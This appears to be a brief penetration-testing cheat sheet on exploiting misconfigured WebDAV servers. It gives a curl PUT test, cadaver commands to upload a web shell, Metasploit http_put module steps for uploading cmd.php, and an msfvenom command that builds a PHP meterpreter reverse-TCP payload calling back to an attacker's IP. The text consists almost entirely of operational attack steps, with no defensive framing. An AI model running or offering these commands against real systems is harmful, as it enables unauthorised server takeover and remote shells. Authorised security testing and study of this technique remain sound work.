# WebDAV

Simple test usinng curl:
```
curl –v http://vulnerable_address/some_folder/verify.txt -X PUT
```
If the target server is misconfigured, the above command will create a new file called verify.txt in the uploads directory.

If the file verify.txt is uploaded on the server, then it is vulnerable.
You can upload a shell using cadaver
```
cadaver http://vulnerable_address/some_folder/
put /location/to/shell
```

### Using metasploit
There is a metasploit module to exploit http put
```
use auxiliary/scanner/http/http_put
Copy cmd.php into /tmp folder and specify that as the FILEDATA.
After uploading, the FILENAME should be cmd.php
```
Even if it says failed, refresh the page and check.

#### Generating php meterpreter payload
```
msfvenom –p php/meterpreter/reverse_tcp LHOST=[attacker’s IP] LPORT=[local port to listen on] –f raw > [filename].php
```
